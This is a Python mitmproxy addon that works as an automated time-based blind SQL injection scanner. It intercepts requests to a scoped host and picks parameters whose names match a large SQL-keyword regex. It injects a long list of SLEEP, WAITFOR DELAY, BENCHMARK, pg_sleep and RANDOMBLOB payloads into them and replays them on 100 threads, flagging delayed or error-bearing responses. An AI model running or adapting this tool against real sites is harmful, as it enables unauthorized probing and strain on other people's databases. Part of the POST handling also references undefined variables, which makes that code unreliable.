from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
import json
import re
import time
import hashlib
from concurrent.futures import ThreadPoolExecutor

class sqlResponse:
    def __init__(self):
        self.scope = "example.com"
        self.flow_dir_sql = "sql_flows"
        os.makedirs(self.flow_dir_sql, exist_ok=True)
        self.response_time_lower_bound = 10  # Lower bound of response time in seconds
        self.response_time_upper_bound = 15  # Upper bound of response time in seconds
        self.hashes_file_path = os.path.join(self.flow_dir_sql, "request_hashes.txt")
        self.processed_requests = self.load_processed_requests()
        self.alteration_indicators_sql = ["'XOR(if(now()=sysdate(),sleep(10),0))OR'","1' and sleep(10)#","sleep(10)#", "1 or sleep(10)#", "\" or sleep(10)#", "' or sleep(10)#", "\" or sleep(10)=\"", "' or sleep(10)='", "1) or sleep(10)#", "\") or sleep(10)=\"", "') or sleep(10)='", "1)) or sleep(10)#", "\")) or sleep(10)=\"", "')) or sleep(10)='", ";waitfor delay '0:0:10'--", ");waitfor delay '0:0:10'--", "';waitfor delay '0:0:10'--", "\";waitfor delay '0:0:10'--", "');waitfor delay '0:0:10'--", "\");waitfor delay '0:0:10'--", "));waitfor delay '0:0:10'--", "'));waitfor delay '0:0:10'--", "\"));waitfor delay '0:0:10'--", "benchmark(10000000,MD5(1))#", "1 or benchmark(10000000,MD5(1))#", "\" or benchmark(10000000,MD5(1))#", "' or benchmark(10000000,MD5(1))#", "1) or benchmark(10000000,MD5(1))#", "\") or benchmark(10000000,MD5(1))#", "') or benchmark(10000000,MD5(1))#", "1)) or benchmark(10000000,MD5(1))#", "\")) or benchmark(10000000,MD5(1))#", "')) or benchmark(10000000,MD5(1))#", "pg_sleep(10)--", "1 or pg_sleep(10)--", "\" or pg_sleep(10)--", "' or pg_sleep(10)--", "1) or pg_sleep(10)--", "\") or pg_sleep(10)--", "') or pg_sleep(10)--", "1)) or pg_sleep(10)--", "\")) or pg_sleep(10)--", "')) or pg_sleep(10)--", "AND (SELECT * FROM (SELECT(SLEEP(10)))bAKL) AND 'vRxe'='vRxe", "AND (SELECT * FROM (SELECT(SLEEP(10)))YjoC) AND '%'='", "AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)", "AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)--", "AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)#", "SLEEP(10)#", "SLEEP(10)--", "SLEEP(10)=\"", "SLEEP(10)='", "or SLEEP(10)", "or SLEEP(10)#", "or SLEEP(10)--", "or SLEEP(10)=\"", "or SLEEP(10)='", "waitfor delay '00:00:10'", "waitfor delay '00:00:10'--", "waitfor delay '00:00:10'#", "benchmark(100000000,MD5(1))", "benchmark(100000000,MD5(1))--", "benchmark(100000000,MD5(1))#", "or benchmark(100000000,MD5(1))", "or benchmark(100000000,MD5(1))--", "or benchmark(100000000,MD5(1))#", "pg_SLEEP(10)", "pg_SLEEP(10)--", "pg_SLEEP(10)#", "or pg_SLEEP(10)", "or pg_SLEEP(10)--", "or pg_SLEEP(10)#", "AnD SLEEP(10)", "AnD SLEEP(10)--", "AnD SLEEP(10)#", "&&SLEEP(10)", "&&SLEEP(10)--", "&&SLEEP(10)#", "' AnD SLEEP(10) ANd '1", "'&&SLEEP(10)&&'1", "ORDER BY SLEEP(10)", "ORDER BY SLEEP(10)--", "ORDER BY SLEEP(10)#", "(SELECT * FROM (SELECT(SLEEP(10)))ecMj)", "(SELECT * FROM (SELECT(SLEEP(10)))ecMj)#", "(SELECT * FROM (SELECT(SLEEP(10)))ecMj)--", "+benchmark(3200,SHA1(1))+'", "+ SLEEP(10) + '", "RANDOMBLOB(1000000000/2)", "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))", "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))", "RANDOMBLOB(1000000000/2)", "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000000/2))))", "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000000/2))))", "SLEEP(10)/*' or SLEEP(10) or '\" or SLEEP(10) or \"*/"]
        self.altered_header_sql = "x-altered-sql"
        self.params_string = ""

    def load_processed_requests(self):
        try:
            with open(self.hashes_file_path, 'r') as file:
                return set(line.strip() for line in file)
        except FileNotFoundError:
            return set()

    def save_processed_request(self, request_hash):
        with open(self.hashes_file_path, 'a') as file:
            file.write(f"{request_hash}\n")

    def request_hash(self, flow, params_string):
        method = flow.request.method
        url = flow.request.url
        request_str = f"{method}{url}{params_string}"
        self.params_string = ""
        return hashlib.sha256(request_str.encode('utf-8')).hexdigest()

    def response(self, flow: http.HTTPFlow) -> None:

        #in Scope
        parsed_url = urlparse(flow.request.url)
        if self.scope not in parsed_url.hostname:
            return  

        
         #--- first phase check the method request ---
        if self.altered_header_sql in flow.request.headers:
            self.check_altered_reflection_sql(flow)
            return


        if flow.request.method == "GET":
            method = flow.request.method

            self.process_parameters_sql(flow, flow.request.query, method)
        elif flow.request.method == "POST":
            method = flow.request.method
            self.process_post_request_sql(flow, method)

         #--- end first phase check the method request ---

    # ---- the porcess parameter called when is POST or GET
                
    def process_parameters_sql(self, flow, params, method):
        content_type = flow.request.headers.get("Content-Type", "")
        if method == "POST":
            all_processed_items = self.if_content_is_json_dic(params)
            for key, content in all_processed_items.items():
                self.params_string += str(key)
            request_id = self.request_hash(flow, self.params_string)
            if request_id in self.processed_requests:
                ctx.log.info("Duplicate request detected, skipping...")
                return
            self.processed_requests.add(request_id)
            self.save_processed_request(request_id)

            for key, content in all_processed_items.items():
                regex_pattern = r"(^|[_\-A-Za-z0-9])(sku|id|select|report|role|update|query|user|name|sort|where|search|params|process|row|view|table|from|sel|results|sleep|fetch|order|keyword|column|field|delete|string|number|filter|count|limit|offset|page|size|group|having|distinct|union|intersect|except|join|inner|outer|left|right|full|on|where|and|or|not|between|in|like|is|null|escape|case|when|then|else|end|exists|any|all|cast|as|into|values|insert|into|update|set|delete|truncate|create|alter|drop|grant|revoke|execute|procedure|function|trigger|schema|database|table|index|view|constraint|primary|foreign|key|unique|check|default|not|identity|auto_increment|commit|rollback|savepoint|transaction|begin|end|analyze|explain|optimize|show|describe|pragma|vacuum|analyze|orderby|asc|desc|having|truncatetable|backup|restore|createdatabase|dropdatabase|grantall|revokeall|addcolumn|modifycolumn|dropcolumn|createindex|dropindex|createtable|droptable|createuser|dropuser|select|insertinto|updateset|deletefrom|unionall|information_schema|sysobjects|syscolumns|sysdatabases|sysusers|xp_cmdshell|exec|sp_executesql|sp_adduser|sp_dropuser|sp_addlogin|sp_droplogin|sp_addrolemember|sp_droprolemember|sp_grantdbaccess|sp_revokedbaccess|sp_addrolemember|sp_droprolemember|sp_addsrvrolemember|sp_dropsrvrolemember|sp_password|xp_regread|xp_regwrite|xp_regdelete|xp_enumgroups|xp_loginconfig|xp_availablemedia|xp_subdirs|xp_fileexist|xp_cmdshell|xp_fixeddrives|xp_servicecontrol|xp_regread|xp_regwrite|xp_regdelete|xp_enumgroups|xp_loginconfig|xp_availablemedia|xp_subdirs|xp_fileexist|xp_cmdshell|xp_fixeddrives|xp_servicecontrol|COALESCE|CONCAT|STUFF|XMLNAMESPACES|XQUERY|XPATH|XSLT|TABLESAMPLE|ROW_NUMBER|RANK|DENSE_RANK|NTILE|LEAD|LAG|FIRST_VALUE|LAST_VALUE)([_\-A-Za-z0-9]|$)"
                if '.' in key:
                    parts = key.split('.')
                    last_part = parts[-1]
                    if re.match(regex_pattern, str(last_part), re.IGNORECASE):
                        self.handle_reflection_sql(flow, key, decoded_json, orginalgetparam)
                else:
                    if re.match(regex_pattern, str(key), re.IGNORECASE):
                        self.handle_reflection_sql(flow, key, decoded_json, orginalgetparam)


        elif method == "GET":
            for param, value in params.items():
                self.params_string += str(param)
            
            request_id = self.request_hash(flow, self.params_string)
            if request_id in self.processed_requests:
                ctx.log.info("Duplicate request detected, skipping...")
                return
            self.processed_requests.add(request_id)
            self.save_processed_request(request_id)
            for param, value in params.items():
                try:
                    orginalgetparam = param
                    decoded_json = json.loads(unquote(value))
                    if isinstance(decoded_json, dict) or isinstance(decoded_json, list):
                        all_processed_items = self.if_content_is_json_dic(decoded_json)

                        for key, content in all_processed_items.items():
                            regex_pattern = r"(^|[_\-A-Za-z0-9])(sku|id|select|report|role|update|query|user|name|sort|where|search|params|process|row|view|table|from|sel|results|sleep|fetch|order|keyword|column|field|delete|string|number|filter|count|limit|offset|page|size|group|having|distinct|union|intersect|except|join|inner|outer|left|right|full|on|where|and|or|not|between|in|like|is|null|escape|case|when|then|else|end|exists|any|all|cast|as|into|values|insert|into|update|set|delete|truncate|create|alter|drop|grant|revoke|execute|procedure|function|trigger|schema|database|table|index|view|constraint|primary|foreign|key|unique|check|default|not|identity|auto_increment|commit|rollback|savepoint|transaction|begin|end|analyze|explain|optimize|show|describe|pragma|vacuum|analyze|orderby|asc|desc|having|truncatetable|backup|restore|createdatabase|dropdatabase|grantall|revokeall|addcolumn|modifycolumn|dropcolumn|createindex|dropindex|createtable|droptable|createuser|dropuser|select|insertinto|updateset|deletefrom|unionall|information_schema|sysobjects|syscolumns|sysdatabases|sysusers|xp_cmdshell|exec|sp_executesql|sp_adduser|sp_dropuser|sp_addlogin|sp_droplogin|sp_addrolemember|sp_droprolemember|sp_grantdbaccess|sp_revokedbaccess|sp_addrolemember|sp_droprolemember|sp_addsrvrolemember|sp_dropsrvrolemember|sp_password|xp_regread|xp_regwrite|xp_regdelete|xp_enumgroups|xp_loginconfig|xp_availablemedia|xp_subdirs|xp_fileexist|xp_cmdshell|xp_fixeddrives|xp_servicecontrol|xp_regread|xp_regwrite|xp_regdelete|xp_enumgroups|xp_loginconfig|xp_availablemedia|xp_subdirs|xp_fileexist|xp_cmdshell|xp_fixeddrives|xp_servicecontrol|COALESCE|CONCAT|STUFF|XMLNAMESPACES|XQUERY|XPATH|XSLT|TABLESAMPLE|ROW_NUMBER|RANK|DENSE_RANK|NTILE|LEAD|LAG|FIRST_VALUE|LAST_VALUE)([_\-A-Za-z0-9]|$)"
                            if '.' in key:
                                parts = key.split('.')
                                last_part = parts[-1]
                                if re.match(regex_pattern, str(last_part), re.IGNORECASE):
                                    self.handle_reflection_sql(flow, key, decoded_json, orginalgetparam)
                            else:
                                if re.match(regex_pattern, str(key), re.IGNORECASE):
                                    self.handle_reflection_sql(flow, key, decoded_json, orginalgetparam)
                except:
                    regex_pattern = r"(^|[_\-A-Za-z0-9])(sku|id|select|report|role|update|query|user|name|sort|where|search|params|process|row|view|table|from|sel|results|sleep|fetch|order|keyword|column|field|delete|string|number|filter|count|limit|offset|page|size|group|having|distinct|union|intersect|except|join|inner|outer|left|right|full|on|where|and|or|not|between|in|like|is|null|escape|case|when|then|else|end|exists|any|all|cast|as|into|values|insert|into|update|set|delete|truncate|create|alter|drop|grant|revoke|execute|procedure|function|trigger|schema|database|table|index|view|constraint|primary|foreign|key|unique|check|default|not|identity|auto_increment|commit|rollback|savepoint|transaction|begin|end|analyze|explain|optimize|show|describe|pragma|vacuum|analyze|orderby|asc|desc|having|truncatetable|backup|restore|createdatabase|dropdatabase|grantall|revokeall|addcolumn|modifycolumn|dropcolumn|createindex|dropindex|createtable|droptable|createuser|dropuser|select|insertinto|updateset|deletefrom|unionall|information_schema|sysobjects|syscolumns|sysdatabases|sysusers|xp_cmdshell|exec|sp_executesql|sp_adduser|sp_dropuser|sp_addlogin|sp_droplogin|sp_addrolemember|sp_droprolemember|sp_grantdbaccess|sp_revokedbaccess|sp_addrolemember|sp_droprolemember|sp_addsrvrolemember|sp_dropsrvrolemember|sp_password|xp_regread|xp_regwrite|xp_regdelete|xp_enumgroups|xp_loginconfig|xp_availablemedia|xp_subdirs|xp_fileexist|xp_cmdshell|xp_fixeddrives|xp_servicecontrol|xp_regread|xp_regwrite|xp_regdelete|xp_enumgroups|xp_loginconfig|xp_availablemedia|xp_subdirs|xp_fileexist|xp_cmdshell|xp_fixeddrives|xp_servicecontrol|COALESCE|CONCAT|STUFF|XMLNAMESPACES|XQUERY|XPATH|XSLT|TABLESAMPLE|ROW_NUMBER|RANK|DENSE_RANK|NTILE|LEAD|LAG|FIRST_VALUE|LAST_VALUE)([_\-A-Za-z0-9]|$)"
                    if re.match(regex_pattern, str(param), re.IGNORECASE):
                        self.handle_reflection_sql(flow, param)


    # ---- -------------------end of the function------------------ ------- -----------

    # ---- porcess post request sql ----------------------------------------

    def process_post_request_sql(self, flow, method):

        content_type = flow.request.headers.get("Content-Type", "")
        if "application/x-www-form-urlencoded" in content_type or "text/plain" in content_type:
            params = urllib.parse.parse_qs(flow.request.get_text())
            #params = self.normalize_query_params(params)
            self.process_parameters_sql(flow, params, method)
        elif "json" in content_type:
            try:
                params = json.loads(flow.request.get_text())
                if isinstance(params, dict):

                    self.process_parameters_sql(flow, params, method)
            except json.JSONDecodeError:
                ctx.log.info("JSON decode error")

    # ---- ------------------end function ----------------------------------------
#---- ---------------- if_content_is_json_dic -----------------------------
   
    def if_content_is_json_dic(self, params, parent_key=''):
        processed_items = {}
        if isinstance(params, dict):
            for key, value in params.items():
                compound_key = f"{parent_key}.{key}" if parent_key else key
                processed_items.update(self.if_content_is_json_dic(value, compound_key))
        elif isinstance(params, list):
            for index, item in enumerate(params):
                compound_key = f"{parent_key}[{index}]"
                processed_items.update(self.if_content_is_json_dic(item, compound_key))
        else:
            # Attempt to parse a JSON-encoded string into a dict or list
            if isinstance(params, str):
                try:
                    parsed_json = json.loads(params)
                    # Recursively process the parsed JSON
                    return self.if_content_is_json_dic(parsed_json, parent_key)
                except json.JSONDecodeError:
                    # Not a JSON string, treat as a base case
                    pass
            # Base case: param is neither a dict, list, nor JSON string
            processed_items[parent_key] = params
        return processed_items

#---- ---------------- end of function -----------------------------

#---- ----------handle reflection function -----------------------------

    def handle_reflection_sql(self, flow, param, dictoniry=None, orginalgetparam=None):
        with ThreadPoolExecutor(max_workers=100) as executor:
            # Logic to handle the reflection, e.g., logging, altering, and replaying
            for indicator in self.alteration_indicators_sql:
                executor.submit(self.alter_and_replay_sql, flow, param, indicator, dictoniry, orginalgetparam)


#---- ----------end of handle reflection function -----------------------------


#---- ---------- alter_and_replay_sql function -----------------------------
    def alter_and_replay_sql(self, original_flow, param, indicator, dictoniry, orginalgetparam):
        altered_value = indicator
        altered_flow = self.alter_request_sql(original_flow, param, altered_value, dictoniry, orginalgetparam)
        if altered_flow:
            ctx.master.commands.call("replay.client", [altered_flow])
#---- ---------- end alter_and_replay_sql function -----------------------------

#---- ---------- set_nested_value function -----------------------------

    def set_nested_value(self, dct, compound_key, value):
        keys = compound_key.split('.')
        for i, key in enumerate(keys):
            if '[' in key and ']' in key:  # Handle list indices within the key
                list_key, index_part = key.split('[')
                index = int(index_part[:-1])  # Remove the ']' and convert to int

                if i == 0:  # Special handling for the first key if it's a list
                    element = dct.get(list_key, [])[index]
                    if isinstance(element, str):  # Check if element is a JSON string
                        if i < len(keys) - 1:  # More keys to navigate
                            parsed_element = json.loads(element)
                            self.set_nested_value(parsed_element, '.'.join(keys[i+1:]), value)  # Recurse
                            dct[list_key][index] = json.dumps(parsed_element)  # Update with modified JSON
                            return
                        else:  # Last key, direct update
                            dct[list_key][index] = value
                            return
                    else:  # If not a string, normal list handling
                        if i < len(keys) - 1:  # Not the last key, so just navigate
                            dct = element
                        else:  # Last key, direct update
                            dct[list_key][index] = value
                            return
                else:  # For nested lists within the structure
                    if i < len(keys) - 1:  # Not the last key, navigate
                        dct = dct[list_key][index]
                    else:  # Last key, update directly
                        dct[list_key][index] = value
            else:  # Handle normal dictionary keys
                if i < len(keys) - 1:  # Not the last key, navigate or create dict
                    dct = dct.setdefault(key, {})
                else:  # Last key, update value
                    dct[key] = value

#---- ---------- end of set_nested_value function -----------------------------

#---- ---------- alter_request_sql function -----------------------------

    def alter_request_sql(self, original_flow, param, altered_value, dictoniry, orginalgetparam):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            if dictoniry:
                if isinstance(dictoniry, list):  # Ensure the dictionary is actually a list
                    try:
                        # Extract indices from the param string, e.g., "[1][3]" -> [1, 3]
                        indices = [int(index.strip('[]')) for index in param.split('][')]
                        body = json.loads(new_request.query[orginalgetparam])
                        target = body
                        # Navigate through the nested structure up to the last index
                        for index in indices[:-1]:
                            target = target[index]
                        # Use the last index to set the new value
                        last_index = indices[-1]
                        if 0 <= last_index < len(target):
                            target[last_index] = altered_value
                            new_request.query[orginalgetparam] = json.dumps(body)  # Update the query parameter
                        else:
                            print("Index out of range.")
                    except (ValueError, IndexError, TypeError) as e:
                        print(f"Error processing nested indices: {e}")
                else:
                    body = json.loads(new_request.query[orginalgetparam])
                    self.set_nested_value(body, param, altered_value)  # Use the utility function here
                    new_request.query[orginalgetparam] = json.dumps(body)
            else:
                new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type or "text/plain" in content_type:
                try:
                    params = urllib.parse.parse_qs(new_request.get_text())
                    self.set_nested_value(params, param, altered_value)
                    new_request.text = urllib.parse.urlencode(params, doseq=True)
                except json.JSONDecodeError:
                    params[orginalgetparam] = [altered_value]
                    new_request.text = urllib.parse.urlencode(params, doseq=True)
                    pass
                    
            elif "json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    self.set_nested_value(body, param, altered_value)  # Use the utility function here
                    new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass

        new_request.headers[self.altered_header_sql] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

#---- ---------- end alter_request_sql function -----------------------------

#---- ---------- check_altered_reflection_sql function -----------------------------
    def check_altered_reflection_sql(self, flow):
        duration = flow.response.timestamp_end - flow.request.timestamp_start
        pattern = r'(SQL error code: -?\d+|database error: .+|syntax error at .+|access violation|query failed: .+|unable to connect to database|query syntax|duplicate entry .+|foreign key constraint fails|unexpected error in query)'
        response_text = flow.response.get_text()
        match = re.search(pattern, response_text, re.IGNORECASE)
        if self.response_time_lower_bound <= duration <= self.response_time_upper_bound or match:
            ctx.log.info(f" SQL injection: {flow.request.url}")
            self.save_flow_sql(flow)
            return

    def save_flow_sql(self, flow):
        identifier = f"sql_{flow.request.method}_{flow.request.host}_{flow.request.path}".replace("/", "_")
        filename = os.path.join(self.flow_dir_sql, f"{identifier}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"Saved altered flow to {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")
#---- ---------- end save_flow_sql function -----------------------------
        

addons = [sqlResponse()]
